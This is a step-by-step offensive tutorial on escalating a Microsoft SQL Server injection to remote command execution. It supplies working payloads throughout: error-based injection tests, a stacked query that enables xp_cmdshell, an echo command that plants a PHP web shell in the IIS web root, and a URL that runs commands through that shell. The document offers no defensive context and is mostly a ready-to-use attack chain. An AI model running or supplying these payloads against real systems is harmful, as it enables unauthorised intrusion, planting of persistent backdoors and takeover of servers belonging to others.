# MSSQL Injection to RCE — Step-by-Step

## Step 1 — Identify MSSQL Injection

1. Test for a basic SQL injection point:
   ```
   ID=1'
   ```
   If this generates an SQL error, the parameter is likely injectable.

2. Confirm the backend is Microsoft SQL Server by checking the database version:
   ```
   ID=1' AND 1=(SELECT CAST(@@version AS int))--
   ```
   A valid response indicates MSSQL is being used.

---

## Step 2 — Enable `xp_cmdshell` for Command Execution

Microsoft SQL Server restricts writing files to web directories unless specific permissions and stored procedures are enabled.

The key procedure needed is **`xp_cmdshell`**, which is **disabled by default**.  
Enable the advanced options and then enable `xp_cmdshell`:

```
' EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

---

## Step 3 — Write a Web Shell to the Server

Create a simple PHP web shell using the Windows `echo` command:

```php
<?php system($_GET["cmd"]); ?>
```

Write the shell into the IIS web root (`C:\inetpub\wwwroot\`):

```
echo ^<?php system($_GET["cmd"]); ?>^> > C:\inetpub\wwwroot\shell.php
```

Final SQL payload using `xp_cmdshell`:

```
' EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?>^> > C:\inetpub\wwwroot\shell.php'--
```

> The **`^`** character escapes `>` so it isn't interpreted as a redirection operator by the command shell.

---

## Step 4 — Test Remote Command Execution

Access the uploaded shell in the browser:

```
http://[TARGET_IP]/shell.php?cmd=whoami
```

If successful, the server should return the output of the executed command.
